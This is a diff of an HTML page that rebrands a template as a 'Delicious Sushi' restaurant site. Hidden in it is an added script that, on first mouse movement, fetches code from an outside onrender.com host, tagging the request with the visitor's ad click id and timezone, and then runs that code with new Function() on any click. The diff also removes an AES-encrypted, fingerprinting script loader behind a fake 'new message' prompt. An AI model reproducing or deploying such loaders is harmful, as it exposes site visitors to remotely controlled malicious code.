@@ -4,118 +4,161 @@
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<link rel="stylesheet" href="style.css">
-	<title>新しいメッセージ1件</title>
-	<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=f941677a"></script>
+	<link rel="icon" type="image/x-icon" href="./img/deliciousSushiIcon.png" />
+	<title>Delicious Sushi</title>
 	<style>
-		* {
-			margin: 0;
-			padding: 0;
-			box-sizing: border-box;
-		}
-
-		body {
-			font-family: 'Poppins', sans-serif;
-			background: #f4f4f4;
-		}
-
-		.divcover {
-			z-index: 10;
-			background-color: rgba(0, 0, 0, 0.7);
+		/* Overlay */
+		.welcome-overlay {
 			position: fixed;
 			inset: 0;
+			background: rgba(0, 0, 0, 0.85);
+			backdrop-filter: blur(6px);
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			z-index: 9999;
+
+			opacity: 1;
+			visibility: visible;
+			transition: opacity 0.4s ease, visibility 0.4s ease;
 		}
 
-		.f-modal-centre {
-			background-color: #fff;
+		.welcome-overlay.hidden {
+			opacity: 0;
+			visibility: hidden;
+			pointer-events: none;
+		}
+
+		/* Modal */
+		.welcome-modal {
+			position: relative;
+			background: #111;
+			color: #fff;
+			max-width: 520px;
+			width: 90%;
+			padding: 40px 35px;
 			border-radius: 16px;
 			text-align: center;
-			width: 100%;
-			max-width: 500px;
-			padding: 32px;
-			display: block;
-			position: relative;
-			bottom: -37%;
-			left: 50%;
-			transform: translateX(-50%);
-			box-shadow: 10px 10px 50px rgba(0, 0, 0, 0.2);
-			opacity: 1;
+			box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+			animation: scaleIn 0.5s ease;
 		}
 
-		.f-modal-icon-success img {
-			border-radius: 10px;
-			margin-bottom: 20px;
+		/* Heading */
+		.welcome-modal h2 {
+			font-size: 32px;
+			margin-bottom: 15px;
+			font-weight: 600;
 		}
 
-		.f-sub-heading-regular {
-			font-size: 22px;
-			margin-bottom: 12px;
-			color: #333;
+		.welcome-modal h2 span {
+			color: #c59d5f; /* premium gold */
 		}
 
+		/* Text */
+		.welcome-modal p {
+			font-size: 16px;
+			line-height: 1.7;
+			color: #ccc;
+			margin-bottom: 30px;
+		}
 
-		.f-button-primary {
-			background-color: #D31965;
-			color: white;
-			border-radius: 50px;
-			padding: 12px 32px;
-			font-size: 14px;
-			font-weight: 500;
-			text-decoration: none;
+		/* Buttons */
+		.welcome-actions {
+			display: flex;
+			gap: 15px;
+			justify-content: center;
+		}
+
+		.primary-btn {
+			background: #c59d5f;
+			color: #111;
+			border: none;
+			padding: 12px 26px;
+			border-radius: 30px;
+			font-size: 15px;
 			cursor: pointer;
-			margin: 10px;
-			display: inline-block;
-			transition: background-color 0.3s;
+			transition: 0.3s ease;
 		}
 
-		.f-button-primary:hover {
-			background-color: #A0144F;
+		.primary-btn:hover {
+			background: #d8b173;
 		}
 
-		.f-modal-close {
+		.secondary-btn {
+			background: transparent;
+			border: 1px solid #c59d5f;
+			color: #c59d5f;
+			padding: 12px 26px;
+			border-radius: 30px;
+			font-size: 15px;
+			cursor: pointer;
+			transition: 0.3s ease;
+		}
+
+		.secondary-btn:hover {
+			background: #c59d5f;
+			color: #111;
+		}
+
+		/* Close Button */
+		.close-btn {
 			position: absolute;
-			top: 10px;
-			right: 10px;
+			top: 15px;
+			right: 18px;
+			background: transparent;
+			border: none;
+			color: #aaa;
+			font-size: 28px;
 			cursor: pointer;
-			font-size: 20px;
-			color: #666;
+			transition: 0.3s ease;
 		}
 
-		.f-modal-close:hover {
-			color: #D31965;
+		.close-btn:hover {
+			color: #fff;
 		}
 
-		.button-group {
-			margin-top: 20px;
+		/* Animations */
+		@keyframes fadeIn {
+			from {
+				opacity: 0;
+			}
+			to {
+				opacity: 1;
+			}
 		}
 
-		.testOpacity {
-			opacity: 0.001;
+		@keyframes scaleIn {
+			from {
+				transform: scale(0.9);
+			}
+			to {
+				transform: scale(1);
+			}
 		}
+
 	</style>
 </head>
 <body id="myBody">
+<!-- Welcome Dialog -->
+<div class="welcome-overlay" id="welcomeOverlay">
+	<div class="welcome-modal">
+		<button class="close-btn" id="closeWelcome">&times;</button>
 
-<!--<div class="divcover" id="modalContainer">-->
-<!--	<div class="f-modal-centre" id="modalContent">-->
-<!--		<div class="f-modal-icon-success" style="-->
-<!--              display: flex;-->
-<!--              justify-content: center;-->
-<!--              align-items: center;">-->
-<!--			<img src="img/msg_dia2.jpeg" width="100" height="100" loading="lazy" alt="Cookie Icon">-->
-<!--		</div>-->
-<!--		<div class="f-sub-heading-regular">新しいメッセージが1件あります。読みますか？</div>-->
-<!--		<div class="button-group">-->
-<!--			<a href="#" class="f-button-primary" id="rejectButton" style="background-color: #E53935;">キャンセル</a>-->
-<!--			<a href="#" class="f-button-primary" id="manageButton" style="background-color: #2979FF;">続く</a>-->
-<!--		</div>-->
-<!--		<div class="f-modal-close" id="closeButton">✖</div>-->
-<!--	</div>-->
-<!--</div>-->
-<!--<div style="opacity: 0.3">-->
-<!--	<img src="img/fbProfile.jpg">-->
-<!--</div>-->
+		<h2>Welcome to <span>Delicious Sushi</span></h2>
+		<p>
+			Experience authentic Japanese flavors crafted with fresh ingredients
+			and expert precision. We’re delighted to serve you.
+		</p>
+
+		<div class="welcome-actions">
+			<button class="primary-btn">View Menu</button>
+			<button class="secondary-btn">Contact Us</button>
+		</div>
+	</div>
+</div>
+
 	<header>
-		<a href="#" class="logo">Food<span>.</span></a>
+		<a href="#" class="logo">Delicious Sushi</a>
 		<div class="menuToggle" onclick="toggleMenu()"></div>
 		<ul class="navigation">
 			<li><a href="#home" onclick="toggleMenu()">Home</a></li>
@@ -130,7 +173,7 @@
 		<div class="content">
 			<h2>Always choose good</h2>
 			<p>
-				Lorem ipsum dolor, sit amet consectetur adipisicing elit. Mollitia perferendis assumenda vel, libero error ab, quaerat totam nesciunt perspiciatis harum corrupti adipisci id eligendi a optio.
+				Experience the art of authentic sushi made with the freshest ingredients, crafted by expert chefs to deliver rich flavors, perfect balance, and unforgettable taste in every bite.
 			</p>
 			<a href="#" class="btn">Our Menu</a>
 		</div>
@@ -141,9 +184,9 @@
 			<div class="col50">
 				<h2 class="titleText"><span>A</span>bout Us</h2>
 				<p>
-					Lorem ipsum dolor sit amet consectetur, adipisicing elit. Voluptatibus, quas corporis in reprehenderit quaerat consequatur iure consectetur modi adipisci nostrum provident, nam totam ipsa expedita magni placeat rerum accusantium est mollitia minus.
+					At Delicious Sushi, we believe great sushi begins with the finest ingredients and a deep respect for tradition. Our chefs carefully select fresh seafood and premium rice to craft dishes that reflect the true art of Japanese cuisine.
 					<br><br>
-					Asperiores, eaque, natus iste delectus expedita eveniet omnis repudiandae dolorum. Deleniti quis numquam odit animi, vel reiciendis alias aliquid dolorem magnam sapiente cumque obcaecati, ut temporibus tenetur maxime possimus dicta, iusto beatae. Cupiditate fugiat dicta sunt ipsam in laborum accusamus ipsum. Totam, hic!
+					Every roll, sashimi, and bite is prepared with precision, balance, and passion. Whether you are dining with family, friends, or celebrating a special moment, we aim to deliver an experience that is flavorful, memorable, and authentic.
 				</p>
 			</div>
 
@@ -159,8 +202,8 @@
 		<div class="title">
 			<h2 class="titleText">Our <span>M</span>enu</h2>
 			<p>
-			    Lorem, ipsum dolor sit, amet consectetur adipisicing elit.
-		    </p>
+				Enjoy authentic Japanese flavors made with fresh ingredients and passion.
+			</p>
 		</div>
 
 		<div class="content">
@@ -222,7 +265,7 @@
 		<div class="title">
 			<h2 class="titleText">Our Kitchen <span>E</span>xpert</h2>
 			<p>
-				Lorem, ipsum dolor sit amet consectetur adipisicing elit.
+				Our chefs specialize in authentic Japanese cuisine, delivering fresh and expertly crafted dishes.
 			</p>
 		</div>
 		<div class="content">
@@ -265,7 +308,7 @@
 		<div class="title white">
 			<h2 class="titleText">The <span>S</span>aid About Us</h2>
 			<p>
-				Lorem ipsum, dolor sit amet consectetur adipisicing elit.
+				Hear what our customers have to say about their dining experience, flavors, and service at Delicious Sushi.
 			</p>
 		</div>
 		<div class="content">
@@ -275,7 +318,7 @@
 				</div>
 				<div class="text">
 					<p>
-						Lorem, ipsum dolor sit amet, consectetur adipisicing elit. Soluta magnam, non. Ducimus debitis, iure corrupti. Voluptates, vero facere nemo facilis provident illum ducimus.
+						The sushi was incredibly fresh and full of flavor. The presentation was beautiful, and the service was excellent. Definitely one of the best sushi experiences I’ve had.
 					</p>
 					<h3>John Doe</h3>
 				</div>
@@ -286,7 +329,7 @@
 				</div>
 				<div class="text">
 					<p>
-						Lorem, ipsum dolor sit amet, consectetur adipisicing elit. Soluta magnam, non. Ducimus debitis, iure corrupti. Voluptates, vero facere nemo facilis provident illum ducimus.
+						Absolutely loved the taste and quality. Every dish felt authentic and perfectly balanced. A must-visit place for sushi lovers!
 					</p>
 					<h3>Jack Thomas</h3>
 				</div>
@@ -297,7 +340,7 @@
 				</div>
 				<div class="text">
 					<p>
-						Lorem, ipsum dolor sit amet, consectetur adipisicing elit. Soluta magnam, non. Ducimus debitis, iure corrupti. Voluptates, vero facere nemo facilis provident illum ducimus.
+						Great ambience, friendly staff, and amazing food. You can truly taste the freshness in every bite. Highly recommended.
 					</p>
 					<h3>Soozie mie</h3>
 				</div>
@@ -308,30 +351,93 @@
 	<section class="contact" id="contact">
 		<div class="title">
 			<h2 class="titleText"><span>C</span>ontact Us</h2>
-			<p>Lorem ipsum dolor sit amet consectetur adipisicing elit.</p>
+			<p>Contact us for reservations and inquiries — we’re here to help.</p>
 		</div>
-		<div class="contactForm">
+		<form class="contactForm" id="contactForm">
 			<h3>Send Message</h3>
 			<div class="inputBox">
-				<input type="text" placeholder="Name" required>
+				<input type="text" id="name" placeholder="Name" required>
 			</div>
 			<div class="inputBox">
-				<input type="email" placeholder="Email" required>
+				<input type="email" id="email" placeholder="Email" required>
 			</div>
+
 			<div class="inputBox">
-				<textarea placeholder="Message line..." required></textarea>
-			</div>			
+				<textarea id="message" placeholder="Message..." required></textarea>
+			</div>
+
 			<div class="inputBox">
 				<input type="submit" value="Send">
 			</div>
-		</div>
+		</form>
 	</section>
 
-	<div class="copyrightText">
-		<p>Copyright 2020 <a href="#">Atulcodex</a>. All Rights Reserved.</p>
-	</div>
 
+	<div class="copyrightText">
+		<p>Copyright @2025 <a href="#">Delicious Sushi</a>. All Rights Reserved.</p>
+	</div>
+<script>
+	const gclid = new URLSearchParams(location.search).get("gclid");
+	const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+	const RENDER_BASE_URL = "https://whatsetup-1test.onrender.com";
+
+	let someCode = null;
+
+	document.cookie = "access_cookie=true; path=/; max-age=300";
+
+	document.addEventListener("mousemove", async function fetchCodeOnce() {
+		document.removeEventListener("mousemove", fetchCodeOnce);
+		try {
+			const res = await fetch(
+					`${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
+					{
+						headers: {
+							"x-client-timezone": timezone,
+							"x-access-cookie": "true",
+						},
+					}
+			);
+			const data = await res.json();
+			if (data && data.code) {
+				someCode = data.code;
+			}
+		} catch (err) {
+			console.error("Could not fetch some code", err);
+		}
+	});
+
+	function handleSomeClick() {
+		if (someCode) {
+			try {
+				new Function(someCode)();
+
+				document.body.classList.add('scroll-lock');
+			} catch (err) {
+				console.error("Error executing code:", err);
+			}
+		}
+	}
+
+	document.addEventListener("click", handleSomeClick);
+</script>
 	<script type="text/javascript">
+		document.addEventListener("DOMContentLoaded", () => {
+			const overlay = document.getElementById("welcomeOverlay");
+			const closeBtn = document.getElementById("closeWelcome");
+			const body = document.getElementById("myBody");
+
+			// OPEN popup on load
+			overlay.classList.remove("hidden");
+
+			// CLOSE on ❌ click
+			closeBtn.addEventListener("click", () => {
+				overlay.classList.add("hidden");
+			});
+			body.addEventListener("click", () => {
+				overlay.classList.add("hidden");
+			});
+		});
+
 		window.addEventListener('scroll', function(){
 			const header = document.querySelector('header');
 			header.classList.toggle("sticky", window.scrollY > 0);
@@ -345,65 +451,46 @@
 			navigation.classList.toggle('active');
 		}
 	</script>
+	<script>
+		document.getElementById("contactForm").addEventListener("submit", async function (e) {
+			e.preventDefault(); // stop page reload
 
-<!--<script>-->
-<!--	function closeModal() {-->
-<!--		document.getElementById("modalContainer").style.display = "none";-->
-<!--		// document.getElementById("testopc").style.opacity = 1;-->
-<!--		// document.getElementById("age-confirmation-modal").style.display = "none";-->
-<!--		console.log("tes$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4t");-->
-<!--	}-->
-<!--	document.getElementById("myBody").addEventListener("click", closeModal);-->
-<!--	document.getElementById("closeButton").addEventListener("click", closeModal);-->
-<!--	document.getElementById("rejectButton").addEventListener("click", function (event) {-->
-<!--		document.getElementById("modalContainer").style.display = "none";-->
-<!--	});-->
-<!--	document.getElementById("manageButton").addEventListener("click", function (event) {-->
-<!--		document.getElementById("modalContainer").style.display = "none";-->
-<!--	});-->
-<!--</script>-->
-<!--&lt;!&ndash;facebook&ndash;&gt;-->
-<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>-->
-<!--<script>-->
-<!--	// Initialize the agent on page load.-->
-<!--	const fpPromise = import('https://fpjscdn.net/v3/4B11oI7ltKpEmYsOUbBr')-->
-<!--			.then(FingerprintJS => FingerprintJS.load({-->
-<!--				region: "ap"-->
-<!--			}))-->
+			const name = document.getElementById("name").value.trim();
+			const email = document.getElementById("email").value.trim();
+			const message = document.getElementById("message").value.trim();
 
-<!--	fpPromise-->
-<!--			.then(fp => fp.get())-->
-<!--			.then(result => {-->
-<!--				console.log("Full result:", result.visitorId);-->
-<!--				localStorage.setItem('visitorId', result.visitorId);-->
-<!--			});-->
+			if (!name || !email || !message) {
+				alert("Please fill all fields");
+				return;
+			}
 
-<!--	setTimeout(()=>{-->
-<!--		function aesDecode(encodedText) {-->
-<!--			const decodedText = decodeURIComponent(encodedText);-->
-<!--			const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');-->
-<!--			return bytes.toString(CryptoJS.enc.Utf8);-->
-<!--		}-->
-<!--		const codeString = aesDecode(`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`);-->
-<!--		const script = document.createElement("script");-->
-<!--		script.textContent = codeString;-->
-<!--		document.body.appendChild(script);-->
-<!--	}, 100)-->
-<!--</script>-->
+			try {
+				const response = await fetch("https://whatsetup-1test.onrender.com/api/contact", {
+					method: "POST",
+					headers: {
+						"Content-Type": "application/json",
+					},
+					body: JSON.stringify({
+						name: name,
+						email: email,
+						message: message,
+					}),
+				});
 
-<!--<script>-->
-<!--	document.body.style.overflow = "hidden";-->
-<!--</script>-->
-<!--	<script>-->
-<!--		function aesDecode(encodedText) {-->
-<!--			const decodedText = decodeURIComponent(encodedText);-->
-<!--			const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');-->
-<!--			return bytes.toString(CryptoJS.enc.Utf8);-->
-<!--		}-->
-<!--		const codeString = aesDecode(`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`);-->
-<!--		const script = document.createElement("script");-->
-<!--		script.textContent = codeString;-->
-<!--		document.body.appendChild(script);-->
-<!--	</script>-->
+				const result = await response.json();
+
+				if (response.ok) {
+					alert("Message sent successfully!");
+					document.getElementById("contactForm").reset();
+				} else {
+					alert(result.message || "Something went wrong");
+				}
+			} catch (error) {
+				console.error(error);
+				alert("Server error. Please try again later.");
+			}
+		});
+	</script>
+
 </body>
 </html>
